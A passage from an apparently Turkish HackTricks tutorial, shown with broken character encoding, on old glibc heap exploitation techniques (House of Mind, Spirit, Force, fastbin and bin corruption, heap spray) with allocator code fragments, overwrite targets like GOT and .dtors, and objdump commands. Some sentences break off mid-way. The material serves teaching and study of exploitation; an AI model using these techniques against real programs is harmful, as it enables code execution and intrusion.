Bu ÅŸekilde, kontrolsÃ¼z olarak iki malloc'Ä± ve birini kontrol ederek Ã¼zerine yazabiliriz, bÃ¶ylece bir exploit yapabiliriz.

**Double free() ZayÄ±flÄ±ÄŸÄ±**

AynÄ± iÅŸaretÃ§iyle iki kez free() Ã§aÄŸrÄ±lÄ±rsa, aynÄ± adrese iÅŸaret eden iki bin oluÅŸur.

Birini tekrar kullanmak isterseniz sorunsuz bir ÅŸekilde atanÄ±r. DiÄŸerini kullanmak isterseniz, aynÄ± alan atanÄ±r, bu nedenle "fd" ve "bk" iÅŸaretÃ§ileri Ã¶nceki rezervasyon tarafÄ±ndan yazÄ±lan verilerle yanÄ±ltÄ±lÄ±r.

**After free()**

Ã–nceden serbest bÄ±rakÄ±lan bir iÅŸaretÃ§i kontrolsÃ¼z bir ÅŸekilde yeniden kullanÄ±lÄ±r.

## **8 Heap TaÅŸmalarÄ±: GeliÅŸmiÅŸ SaldÄ±rÄ±lar**

Unlink() ve FrontLink() teknikleri, unlink() iÅŸlevi deÄŸiÅŸtirildiÄŸinde kaldÄ±rÄ±ldÄ±.

**The house of mind**

YalnÄ±zca bir free() Ã§aÄŸrÄ±sÄ±, keyfi kodun yÃ¼rÃ¼tÃ¼lmesine neden olmak iÃ§in yeterlidir. Bir Ã¶nceki parÃ§ayÄ± taÅŸÄ±mak ve serbest bÄ±rakmak iÃ§in taÅŸan bir ikinci parÃ§aya ihtiyaÃ§ vardÄ±r.

Bir free() Ã§aÄŸrÄ±sÄ±, public\_fREe(mem) iÅŸlevini Ã§aÄŸÄ±rÄ±r, bu iÅŸlev:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> ParÃ§anÄ±n baÅŸladÄ±ÄŸÄ± adrese bir iÅŸaretÃ§i dÃ¶ndÃ¼rÃ¼r (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

\[1] kÄ±smÄ±nda size alanÄ±nÄ±n NON\_MAIN\_ARENA bitini kontrol eder, bu biti deÄŸiÅŸtirebiliriz, bÃ¶ylece heap\_for\_ptr() iÅŸlevini Ã§aÄŸÄ±rÄ±rÄ±z, bu iÅŸlev "mem" Ã¼zerinde bir and iÅŸlemi yapar ve en Ã¶nemli 2.5 baytÄ± sÄ±fÄ±rlar (Ã¶rneÄŸin 0x0804a000 iÃ§in 0x08000000 yapar) ve 0x08000000->ar\_ptr'ye eriÅŸir (struct heap\_info gibi).

Bu ÅŸekilde, Ã¶rneÄŸin 0x0804a000'de kontrol edilebilir bir parÃ§amÄ±z varsa ve 0x081002a0'de bir parÃ§a serbest bÄ±rakÄ±lÄ±yorsa, 0x08100000 adresine ulaÅŸabilir ve istediÄŸimiz ÅŸeyi yazabiliriz, Ã¶rneÄŸin 0x0804a000. Bu ikinci parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, heap\_for\_ptr(ptr)->ar\_ptr'nin 0x08100000'de yazdÄ±ÄŸÄ±mÄ±z deÄŸeri dÃ¶ndÃ¼receÄŸini gÃ¶recektir (0x081002a0'ye uygulanan and iÅŸlemi nedeniyle ilk 4 baytÄ±n deÄŸerini alÄ±r, yani ar\_ptr deÄŸerini).

Bu ÅŸekilde \_int\_free(ar\_ptr, mem) Ã§aÄŸrÄ±lÄ±r, yani \_int\_free(0x0804a000, 0x081002a0) Ã§aÄŸrÄ±lÄ±r\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

YukarÄ±da gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi av deÄŸerini kontrol edebiliriz, Ã§Ã¼nkÃ¼ serbest bÄ±rakÄ±lacak parÃ§aya yazdÄ±ÄŸÄ±mÄ±z deÄŸerdir.

unsorted\_chunks olarak tanÄ±mlandÄ±ÄŸÄ± gibi bck = \&av->bins\[2]-8; ve fwd = bck->fd = \*(av->bins\[2]); ve fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle av->bins\[2]'ye \_\_DTOR\_END\_\_-12 deÄŸerini yazarsak, son talimatta \_\_DTOR\_END\_\_ adresine ikinci parÃ§anÄ±n adresi yaz
Bu teknik artÄ±k uygulanamaz Ã§Ã¼nkÃ¼ unlink iÃ§in neredeyse aynÄ± yama uygulandÄ±. Yeni hedef siteye de iÅŸaret edip etmediÄŸi karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r.

**Fastbin**

The house of mind'in bir varyasyonudur.

\_int\_free() fonksiyonunun ilk kontrolÃ¼nden sonra aÅŸaÄŸÄ±daki kodu Ã§alÄ±ÅŸtÄ±rmak istiyoruz:

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

BÃ¶ylece "fb" adresi, GOT'ta bir iÅŸlevin adresini gÃ¶sterir ve bu adrese Ã¼zerine yazÄ±lacak olan parÃ§anÄ±n adresi yerleÅŸtirilir. Bunun iÃ§in arena'nÄ±n dtors adreslerine yakÄ±n olmasÄ± gerekmektedir. Daha kesin olarak, av->max\_fast'in Ã¼zerine yazÄ±lacak olan adres olmasÄ± gerekmektedir.

The House of Mind ile kontrol edilebilir olduÄŸumuzu gÃ¶rdÃ¼k.

Bu durumda, size alanÄ±na 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu girersek, fastbin\_index() bize fastbins\[-1]'i dÃ¶ndÃ¼recektir ve bu da av->max\_fast'e iÅŸaret edecektir.

Bu durumda av->max\_fast Ã¼zerine yazÄ±lacak olan adres olacak (iÅŸaret ettiÄŸi deÄŸil, Ã¼zerine yazÄ±lacak olan adres).

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§aya bitiÅŸik olan parÃ§anÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekmektedir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunu 8 olarak belirttiÄŸimiz iÃ§in, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut yerleÅŸtirmemiz gerekmektedir (ayrÄ±ca shellcode serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±ndan, sahte parÃ§anÄ±n boyut alanÄ±nÄ±n hemen baÅŸÄ±na nops'a dÃ¼ÅŸen bir jmp koymamÄ±z gerekecektir).

AyrÄ±ca, aynÄ± sahte parÃ§anÄ±n av->system\_mem'den daha kÃ¼Ã§Ã¼k olmasÄ± gerekmektedir. av->system\_mem, bu adresin 1848 bayt Ã¶tesinde bulunur.

\_DTOR\_END\_ ve GOT'taki az sayÄ±da adres nedeniyle, bu bÃ¶lÃ¼mlerin hiÃ§biri Ã¼zerine yazÄ±lacak adres olarak kullanÄ±lamaz, bu yÃ¼zden fastbin'i stack'i hedef almak iÃ§in nasÄ±l kullanabileceÄŸimize bakalÄ±m.

BaÅŸka bir saldÄ±rÄ± ÅŸekli, **av**'yi stack'e yÃ¶nlendirmektir.

Size'Ä± 16 yerine 8 yaparsak: fastbin\_index() bize fastbins\[0]'Ä± dÃ¶ndÃ¼recektir ve bunu stack'i Ã¼zerine yazmak iÃ§in kullanabiliriz.

Bunun iÃ§in stack'te canary veya garip deÄŸerler olmamalÄ±dÄ±r, aslÄ±nda stack'te ÅŸu ÅŸekilde olmalÄ±yÄ±z: 4 boÅŸ bayt + EBP + RET

4 boÅŸ bayt, **av**'nin bu adrese iÅŸaret edeceÄŸi ve bir **av**'in ilk Ã¶ÄŸesinin 0 olmasÄ± gereken mutexe'nin deÄŸeri olmasÄ± gerekmektedir.

**av->max\_fast**, EBP olacak ve kÄ±sÄ±tlamalarÄ± atlamamÄ±za yardÄ±mcÄ± olacak bir deÄŸer olacaktÄ±r.

**av->fastbins\[0]**, **p**'nin adresiyle Ã¼zerine yazÄ±lacak ve RET olacak, bÃ¶ylece shellcode'a atlayacak.

AyrÄ±ca, **av->system\_mem**'de (stack Ã¼zerindeki konumdan 1484 bayt yukarÄ±da) atlamamÄ±za izin verecek kadar Ã§Ã¶p olmalÄ±dÄ±r.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§aya bitiÅŸik olan parÃ§anÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekmektedir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunu 16 olarak belirttiÄŸimiz iÃ§in, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut yerleÅŸtirmemiz gerekmektedir (ayrÄ±ca shellcode serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±ndan, sahte parÃ§anÄ±n boyut alanÄ±nÄ±n hemen baÅŸÄ±na nops'a dÃ¼ÅŸen bir jmp koymamÄ±z gerekecektir).

**The House of Spirit**

Bu durumda, saldÄ±rgan tarafÄ±ndan deÄŸiÅŸtirilebilen bir malloc iÅŸaretÃ§isine ihtiyaÃ§ duyuyoruz (Ã¶rneÄŸin, iÅŸaretÃ§i bir deÄŸiÅŸkenin taÅŸmasÄ±nÄ±n altÄ±nda stack'te bulunuyor).

BÃ¶ylece, bu iÅŸaretÃ§iyi istediÄŸimiz yere yÃ¶nlendirebiliriz. Ancak, herhangi bir yer geÃ§erli deÄŸildir, sahte parÃ§anÄ±n boyutu av->max\_fast'ten kÃ¼Ã§Ã¼k olmalÄ± ve daha spesifik olarak malloc()+8 iÃ§in gelecekteki bir Ã§aÄŸrÄ±da talep edilen boyuta eÅŸit olmalÄ±dÄ±r. Bu nedenle, eÄŸer bu savunmasÄ±z iÅŸaretÃ§iden sonra malloc(40) Ã§aÄŸrÄ±lÄ±yorsa, sahte parÃ§anÄ±n boyutu 48 olmalÄ±dÄ±r.

Ã–rneÄŸin, program kullanÄ±cÄ±dan bir sayÄ± istiyorsa, 48 girebilir ve deÄŸiÅŸtirilebilir malloc iÅŸaretÃ§isini takip eden 4 baytÄ± (ÅŸanslÄ±ysa EBP'ye ait olabilir, bu yÃ¼zden 48 arkada kalÄ±r gibi) iÅŸaretleyebiliriz. AyrÄ±ca, ptr-4+48 adresinin (bu durumda ptr=EBP) birkaÃ§ koÅŸulu saÄŸlamasÄ± gerekmektedir, yani 8 < ptr-4+48 < av->system\_mem.

Bu koÅŸullar saÄŸlandÄ±ÄŸÄ±nda, sÃ¶ylediÄŸimiz gibi bir sonraki malloc Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, EBP'nin adresi olarak EBP'nin adresi atanÄ±r. SaldÄ±rgan ayrÄ±ca bu malloc'a yazÄ±lan verileri kontrol edebiliyorsa, istediÄŸi adrese EBP ve EIP'yi Ã¼zerine yazabilir.

Bunun nedeni, free() Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, stack'in EBP'sine iÅŸaret eden adreste yeni malloc() iÃ§in mÃ¼kemmel bir boyutta bir parÃ§a olduÄŸunu kaydedeceÄŸidir, bu yÃ¼zden o adrese atanÄ±r.

**The House of Force**

Gereklidir:

* Wilderness'Ä± Ã¼zerine yazmaya izin veren bir parÃ§anÄ±n taÅŸmasÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan boyutta bir malloc() Ã§aÄŸrÄ±sÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan verilere sahip bir malloc() Ã§aÄŸrÄ±sÄ±

Ä°lk olarak, wilderness parÃ§asÄ±nÄ±n boyutunu Ã§ok bÃ¼yÃ¼k bir deÄŸerle (0xffffffff) Ã¼zerine yazarak, yeterince bÃ¼yÃ¼k bir bellek talebi, heap'i geniÅŸletmeye gerek kalmadan \_int\_malloc() tarafÄ±ndan iÅŸlenecektir.

Ä°kincisi, av->top'u saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bir bellek bÃ¶lgesine, Ã¶rneÄŸin stack'e iÅŸaret edecek ÅŸekilde deÄŸiÅŸtirmektir. av->top'a \&EIP - 8 yerleÅŸtirilir.

av->top'u saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bellek bÃ¶lgesine iÅŸaret edecek ÅŸekilde Ã¼zerine yazmamÄ±z gerekmektedir:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parÃ§asÄ±nÄ±n adresini (yani mevcut av->top) alÄ±r ve remainder, bu adresin malloc() tarafÄ±ndan talep edilen bayt sayÄ±sÄ±yla toplamÄ±dÄ±r. Bu nedenle, \&EIP-8 0xbffff224 adresinde ise ve av->top 0x080c2788 adresini iÃ§eriyorsa, av->top'u bir sonraki malloc() iÃ§in \&EIP-8'e iÅŸaret edecek ÅŸekilde ayarlamak iÃ§in kontrol edilen malloc() iÃ§in rezerve edilmesi gereken bayt miktarÄ±
## Linux Exploitasyonu - Temel ESP SaldÄ±rÄ±larÄ±

### Heap Overflow ile Kontrol Edilebilir Malloc

Bu saldÄ±rÄ± iÃ§in aÅŸaÄŸÄ±daki gereksinimler vardÄ±r:

- Ä°kinci parÃ§anÄ±n serbest bÄ±rakÄ±ldÄ±ktan ve binine yerleÅŸtirildikten sonra ilk malloc'a overflow yapÄ±labilir (yani, overflow yapmadan Ã¶nce ikinci parÃ§a Ã¼zerinde daha bÃ¼yÃ¼k bir malloc yapÄ±lmalÄ±dÄ±r).
- SaldÄ±rgan tarafÄ±ndan kontrol edilebilen bir adrese sahip olmalÄ±dÄ±r.

AmacÄ±mÄ±z, bir heap Ã¼zerinde overflow yapabilmek iÃ§in altÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ ve binine yerleÅŸtirilmiÅŸ bir parÃ§ayÄ± deÄŸiÅŸtirmektir. Bk iÅŸaretÃ§isini deÄŸiÅŸtirerek ve bu parÃ§a binin ilk parÃ§asÄ± haline geldiÄŸinde bin'i aldatarak, bin'e sahte bir adres (Ã¶rneÄŸin stack veya GOT) olduÄŸunu sÃ¶yleyebiliriz. Bu durumda, saldÄ±rganÄ±n izinleri olan baÅŸka bir parÃ§a rezerve edildiÄŸinde, istenen konumda bir parÃ§a verilecek ve saldÄ±rgan bu parÃ§aya yazabilecektir.

DeÄŸiÅŸtirilen parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±ndan sonra, serbest bÄ±rakÄ±lan parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a rezerve edilmelidir, bÃ¶ylece deÄŸiÅŸtirilen parÃ§a "unsorted bins"den Ã§Ä±karÄ±lÄ±p kendi binine yerleÅŸtirilebilir.

ParÃ§anÄ±n binine yerleÅŸtirildikten sonra, overflow kullanarak bk iÅŸaretÃ§isini istediÄŸimiz adresi gÃ¶sterecek ÅŸekilde deÄŸiÅŸtirmemiz gerekmektedir.

Bu durumda, bin'in, sahte adresin bir sonraki parÃ§anÄ±n adresi olduÄŸuna inanmasÄ±nÄ± saÄŸlamak iÃ§in bin'in yeterli sayÄ±da malloc() Ã§aÄŸrÄ±sÄ±nÄ± beklemesi gerekmektedir. ArdÄ±ndan istenen parÃ§a verilecektir.

Bu saldÄ±rÄ±nÄ±n mÃ¼mkÃ¼n olduÄŸu en kÄ±sa sÃ¼rede gerÃ§ekleÅŸmesi iÃ§in ideal olan ÅŸudur: ZayÄ±f nokta parÃ§asÄ±nÄ±n rezerve edilmesi, deÄŸiÅŸtirilecek parÃ§anÄ±n rezerve edilmesi, bu parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§adan daha bÃ¼yÃ¼k bir parÃ§anÄ±n rezerve edilmesi, parÃ§a deÄŸiÅŸtirilmesi (zayÄ±f nokta), zayÄ±f noktadan aynÄ± boyutta bir parÃ§a rezerve edilmesi ve ikinci bir parÃ§anÄ±n aynÄ± boyutta rezerve edilmesi ve bu parÃ§a seÃ§ilen adrese iÅŸaret edecektir.

Bu saldÄ±rÄ±yÄ± korumak iÃ§in, tipik olarak parÃ§anÄ±n "yanlÄ±ÅŸ" olmadÄ±ÄŸÄ± kontrol edilir: bck->fd'nin victim'a iÅŸaret etmediÄŸi kontrol edilir. Yani, bizim durumumuzda, stack'te iÅŸaretlenen sahte parÃ§anÄ±n fd\* iÅŸaretÃ§isi victim'a iÅŸaret ediyorsa. Bu korumayÄ± aÅŸmak iÃ§in, saldÄ±rganÄ±n uygun adrese (muhtemelen stack Ã¼zerinden) victim'Ä±n adresini bir ÅŸekilde yazabilmesi gerekir. BÃ¶ylece, sahte bir parÃ§a gibi gÃ¶rÃ¼necektir.

### LargeBin BozulmasÄ±

Bu saldÄ±rÄ± iÃ§in Ã¶nceki gereksinimlerin yanÄ± sÄ±ra bazÄ± ek gereksinimler vardÄ±r ve rezerve edilen parÃ§alar 512'den bÃ¼yÃ¼k olmalÄ±dÄ±r.

Bu saldÄ±rÄ±, Ã¶nceki saldÄ±rÄ±yla aynÄ±dÄ±r, yani bk iÅŸaretÃ§isini deÄŸiÅŸtirmek gerekmektedir ve tÃ¼m bu malloc() Ã§aÄŸrÄ±larÄ±na ihtiyaÃ§ vardÄ±r, ancak ayrÄ±ca deÄŸiÅŸtirilen parÃ§anÄ±n boyutunu nb - MINSIZE'dan kÃ¼Ã§Ã¼k olacak ÅŸekilde deÄŸiÅŸtirmek gerekmektedir.

Ã–rneÄŸin, 1552 boyutunu kullanarak 1552 - 1544 = 8 < MINSIZE olacak ÅŸekilde boyutu deÄŸiÅŸtiririz (Ã§Ä±karma iÅŸlemi negatif olamaz Ã§Ã¼nkÃ¼ unsigned karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r).

AyrÄ±ca, daha da karmaÅŸÄ±k hale getirmek iÃ§in bir yama eklenmiÅŸtir.

### Heap Spreyi

Temel olarak, mÃ¼mkÃ¼n olan tÃ¼m belleÄŸi heap'ler iÃ§in rezerve etmek ve bunlarÄ± nops ile biten bir shellcode ile doldurmaktÄ±r. AyrÄ±ca, bir dolgu olarak 0x0c kullanÄ±lÄ±r. Bu durumda, 0x0c0c0c0c adresine atlamaya Ã§alÄ±ÅŸÄ±lacak ve bu dolguyla Ã§aÄŸrÄ±lacak herhangi bir adrese Ã¼zerine yazÄ±lÄ±rsa, oraya atlayacaktÄ±r. Temel olarak, birÃ§ok parÃ§a rezerve ederek, herhangi bir iÅŸaretÃ§inin Ã¼zerine yazÄ±lÄ±p yazÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶rmek ve 0x0c0c0c0c adresine atlamak iÃ§in beklemektir, umarÄ±z orada nops bulunur.

### Heap Feng Shui

Bu saldÄ±rÄ±, rezervasyonlar ve serbest bÄ±rakmalar aracÄ±lÄ±ÄŸÄ±yla belleÄŸi Ã¶yle bir ÅŸekilde dÃ¼zenlemeyi iÃ§erir ki, serbest bÄ±rakÄ±lan parÃ§alar arasÄ±nda rezerve edilmiÅŸ parÃ§alar kalÄ±r. TaÅŸma yapÄ±lacak tampon bir yumurtanÄ±n iÃ§ine yerleÅŸtirilir.

### Komutlar

- `objdump -d executable` â€”> FonksiyonlarÄ± disassembler ile gÃ¶rÃ¼ntÃ¼leme
- `objdump -d ./PROGRAMA | grep FUNCTION` â€”> Fonksiyon adresini almak iÃ§in
- `objdump -d -Mintel ./shellcodeout` â€”> Shellcode'umuz olduÄŸunu doÄŸrulamak ve OpCodes'larÄ± almak iÃ§in
- `objdump -t ./exec | grep varBss` â€”> Sembol tablosu, deÄŸiÅŸken ve fonksiyon adreslerini almak iÃ§in
- `objdump -TR ./exec | grep exit(func lib)` â€”> KÃ¼tÃ¼phane fonksiyonlarÄ±nÄ±n adreslerini almak iÃ§in (GOT)
- `objdump -d ./exec | grep funcCode`
- `objdump -s -j .dtors /exec`
- `objdump -s -j .got ./exec`
- `objdump -t --dynamic-relo ./exec | grep puts` â€”> GOT'ta Ã¼zerine yazÄ±lacak puts adresini almak iÃ§in
- `objdump -D ./exec` â€”> TÃ¼mÃ¼nÃ¼ disassembler ile gÃ¶rÃ¼ntÃ¼leme, plt giriÅŸlerine kadar
- `objdump -p -/exec`
- `Info functions strncmp` â€”> gdb'de fonksiyon hakkÄ±nda bilgi almak

## Ä°lginÃ§ Kurslar

- [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
- [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Referanslar**

- [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> adlÄ± kursla sÄ±fÄ±rdan kahraman olmak iÃ§in HackTricks'i destekleyin!</summary>

HackTricks'yi desteklemenin diÄŸer yollarÄ±:

- Åirketinizi HackTricks'te **reklam vermek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
- [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
- Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin.
- ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live).
- Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
